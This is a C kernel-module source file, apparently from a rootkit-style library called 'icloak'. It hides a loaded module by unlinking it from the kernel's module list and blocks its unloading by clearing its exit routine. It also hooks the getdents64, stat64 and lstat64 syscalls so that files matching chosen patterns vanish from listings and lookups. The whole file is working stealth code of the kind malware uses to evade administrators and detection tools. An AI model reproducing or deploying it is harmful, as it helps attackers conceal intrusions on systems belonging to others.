/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include <linux/incantations.h>
#include <linux/get_modules_list.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <utils/icloak_ctx.h>
#include <utils/memory.h>
#include <kook.h>

static struct list_head *g_modules = NULL;

static struct module *find_lkm(const char *name);

asmlinkage long icloak_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

asmlinkage long icloak_stat64(const char __user *filename, struct stat64 __user *statbuf);

asmlinkage long icloak_lstat64(const char __user *filename, struct stat64 __user *statbuf);

asmlinkage long (*getdents64_syscall)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) = NULL;

asmlinkage long (*stat64_syscall)(const char __user *filename, struct stat64 __user *statbuf) = NULL;

asmlinkage long (*lstat64_syscall)(const char __user *filename, struct stat64 __user *statbuf) = NULL;

static icloak_filename_pattern_ctx *g_icloak_hidden_patterns = NULL, *g_icloak_hidden_patterns_tail = NULL;

static struct mutex g_icloak_hidden_patterns_mtx;

static int g_icloak_mtx_init = 0;

#define init_hidden_patterns_mutex {\
    if (!g_icloak_mtx_init) {\
        mutex_init(&g_icloak_hidden_patterns_mtx);\
        g_icloak_mtx_init= 1;\
    }\
}

#define lock_hidden_patterns_mutex(stmt) {\
    if (!mutex_trylock(&g_icloak_hidden_patterns_mtx)) {\
        stmt;\
    }\
}

#define unlock_hidden_patterns_mutex {\
    mutex_unlock(&g_icloak_hidden_patterns_mtx);\
}

int native_icloak_ko(const char *name) {
    struct module *lkm;

    if (g_modules == NULL) {
        g_modules = get_modules_list();
    }

    if (g_modules == NULL || name == NULL) {
        return 1;
    }

    preempt_disable();

    if ((lkm = find_lkm(name)) != NULL) {
        list_del_init(&lkm->list);
    }

    preempt_enable();

    return (lkm != NULL) ? 0 : 1;
}

int native_icloak_mk_ko_perm(const char *name, void **exit) {
    struct module *lkm;

    if (g_modules == NULL) {
        g_modules = get_modules_list();
    }

    if (g_modules == NULL || name == NULL) {
        return 1;
    }

    preempt_disable();

    if ((lkm = find_lkm(name)) != NULL) {
        if (exit != NULL) {
            *exit = lkm->exit;
        }

        lkm->exit = NULL;
    }

    preempt_enable();

    return (lkm != NULL) ? 0 : 1;
}

int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
    struct module *lkm;

    if (g_modules == NULL) {
        g_modules = get_modules_list();
    }

    if (g_modules == NULL || name == NULL || exit == NULL) {
        return 1;
    }

    preempt_disable();

    if ((lkm = find_lkm(name)) != NULL && lkm->exit == NULL) {
        lkm->exit = exit;
    }

    preempt_enable();

    return (lkm != NULL && lkm->exit == exit) ? 0 : 1;
}

int native_hide_file(const char *pattern) {
    if (pattern == NULL) {
        return 1;
    }

    init_hidden_patterns_mutex

    // INFO(Rafael): Performing the syscall hookings if it was not done before.

    if (getdents64_syscall == NULL) {
        kook(__NR_getdents64, icloak_getdents64, (void **)&getdents64_syscall);
    }

    if (stat64_syscall == NULL) {
        kook(__NR_stat64, icloak_stat64, (void **)&stat64_syscall);
    }

    if (lstat64_syscall == NULL) {
        kook(__NR_lstat64, icloak_lstat64, (void **)&lstat64_syscall);
    }

    lock_hidden_patterns_mutex(return 1);

    g_icloak_hidden_patterns = icloak_add_filename_pattern(g_icloak_hidden_patterns,
                                                           pattern, strlen(pattern), &g_icloak_hidden_patterns_tail);

    unlock_hidden_patterns_mutex

    return 0;
}

int native_show_file(const char *pattern) {
    if (pattern == NULL) {
        return 1;
    }

    init_hidden_patterns_mutex

    lock_hidden_patterns_mutex(return 1);

    g_icloak_hidden_patterns = icloak_del_filename_pattern(g_icloak_hidden_patterns, pattern);

    if (g_icloak_hidden_patterns == NULL) {
        // INFO(Rafael): Having an empty list we can undo the sycall hookings.
        if (getdents64_syscall != NULL) {
            if (kook(__NR_getdents64, getdents64_syscall, NULL) == 0) {
                getdents64_syscall = NULL;
            }
        }

        if (stat64_syscall != NULL) {
            if (kook(__NR_stat64, stat64_syscall, NULL) == 0) {
                stat64_syscall = NULL;
            }
        }

        if (lstat64_syscall != NULL) {
            if (kook(__NR_lstat64, lstat64_syscall, NULL) == 0) {
                lstat64_syscall = NULL;
            }
        }

        g_icloak_mtx_init = 0;
        unlock_hidden_patterns_mutex

        mutex_destroy(&g_icloak_hidden_patterns_mtx);

        goto native_show_file_epilogue;
    }

    unlock_hidden_patterns_mutex

native_show_file_epilogue:

    return 0;
}

static struct module *find_lkm(const char *name) {
    struct module *p;

    list_for_each_entry(p, g_modules, list) {
        if (strcmp(p->name, name) == 0) {
            return p;
        }
    }

    return NULL;
}

asmlinkage long icloak_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    long total, num, delta;
    struct linux_dirent64 *dirp;
    void *buf = NULL, *bp;

    num = total = getdents64_syscall(fd, dirent, count);

    buf = icloak_alloc(total);

    if (buf == NULL) {
        return 0;
    }

    memset(buf, 0, total);

    dirp = dirent;
    delta = 0;
    bp = buf;

    lock_hidden_patterns_mutex(return 0);

    while (num > 0) {
        if (icloak_match_filename(dirp->d_name, g_icloak_hidden_patterns)) {
            delta += dirp->d_reclen;
        } else {
            memcpy(bp, dirp, dirp->d_reclen);
            bp += dirp->d_reclen;
        }

        num -= dirp->d_reclen;
        dirp = (void *)dirp + dirp->d_reclen;
    }

    memset(dirent, 0, total);
    total -= delta;
    memcpy(dirent, buf, total);

    icloak_free(buf);

    unlock_hidden_patterns_mutex

    return total;
}

asmlinkage long icloak_stat64(const char __user *filename, struct stat64 __user *statbuf) {
    int matches;

    lock_hidden_patterns_mutex(return EFAULT);

    matches = icloak_match_filename(filename, g_icloak_hidden_patterns);

    unlock_hidden_patterns_mutex

    if (matches) {
        return -ENOENT;
    }

    return stat64_syscall(filename, statbuf);
}

asmlinkage long icloak_lstat64(const char __user *filename, struct stat64 __user *statbuf) {
    return icloak_stat64(filename, statbuf);
}

#undef init_hidden_patterns_mutex

#undef lock_hidden_patterns_mutex

#undef unlock_hidden_patterns_mutex
